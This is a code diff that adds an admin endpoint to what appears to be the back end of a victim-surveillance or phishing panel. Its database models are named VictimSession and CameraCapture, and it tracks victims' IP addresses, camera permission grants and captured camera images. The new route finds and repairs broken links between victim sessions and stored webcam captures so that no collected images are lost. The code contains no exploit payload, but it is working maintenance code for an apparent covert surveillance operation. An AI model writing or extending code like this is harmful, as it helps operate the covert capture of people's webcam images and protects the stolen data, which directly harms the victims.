@@ -674,6 +674,83 @@ router.post('/sessions/:id/permissions/trigger', async (req, res) => {
   }
 });
 
+// GET /api/admin/camera-captures/recover - Find sessions that have camera access but no CameraCapture docs, or reconstruct missing ones
+router.get('/camera-captures/recover', async (req, res) => {
+  try {
+    // Find sessions with cameraAccessGranted but sparse cameraImages
+    const sessions = await VictimSession.find({
+      cameraAccessGranted: true
+    }).select('sessionId ipAddress cameraImages cameraAccessGranted').lean();
+
+    const recoveryResults = [];
+    
+    for (const session of sessions) {
+      const captureCount = await CameraCapture.countDocuments({ sessionId: session._id });
+      
+      if (captureCount === 0 && session.cameraImages && session.cameraImages.length > 0) {
+        // cameraImages references exist but no CameraCapture docs - recreate them
+        for (const imgId of session.cameraImages) {
+          const existingCapture = await CameraCapture.findById(imgId);
+          if (!existingCapture) {
+            // The reference exists in session but not in CameraCapture collection
+            // This could be from a failed save - flag it
+            recoveryResults.push({
+              sessionId: session._id,
+              sessionIdStr: session.sessionId,
+              issue: 'orphaned_reference',
+              orphanedId: imgId
+            });
+          }
+        }
+      }
+      
+      if (captureCount === 0 && (!session.cameraImages || session.cameraImages.length === 0)) {
+        // Camera was granted but no captures were saved
+        recoveryResults.push({
+          sessionId: session._id,
+          sessionIdStr: session.sessionId,
+          issue: 'no_captures_at_all',
+          cameraAccessGranted: true
+        });
+      }
+    }
+
+    // Also check for any CameraCapture docs that aren't referenced in their session
+    const allCaptures = await CameraCapture.find().lean();
+    const orphanCaptures = [];
+    
+    for (const cap of allCaptures) {
+      if (!cap.sessionId) {
+        orphanCaptures.push(cap._id);
+        continue;
+      }
+      const parentSession = await VictimSession.findById(cap.sessionId).select('cameraImages').lean();
+      if (!parentSession) {
+        orphanCaptures.push({ captureId: cap._id, sessionId: cap.sessionId, reason: 'parent_session_deleted' });
+        continue;
+      }
+      if (!parentSession.cameraImages || !parentSession.cameraImages.some(id => id.toString() === cap._id.toString())) {
+        // Capture exists but isn't in session's cameraImages array - fix it
+        await VictimSession.updateOne(
+          { _id: cap.sessionId },
+          { $addToSet: { cameraImages: cap._id } }
+        );
+        orphanCaptures.push({ captureId: cap._id, sessionId: cap.sessionId, reason: 'fixed_missing_reference' });
+      }
+    }
+
+    res.json({
+      totalSessionsWithCameraAccess: sessions.length,
+      totalCameraCaptures: allCaptures.length,
+      recoveryResults,
+      orphanCapturesFixed: orphanCaptures.filter(o => o.reason === 'fixed_missing_reference').length,
+      orphanDetails: orphanCaptures
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
 // GET /api/admin/permissions/stats - Aggregate permissions overview
 router.get('/permissions/stats', async (req, res) => {
   try {
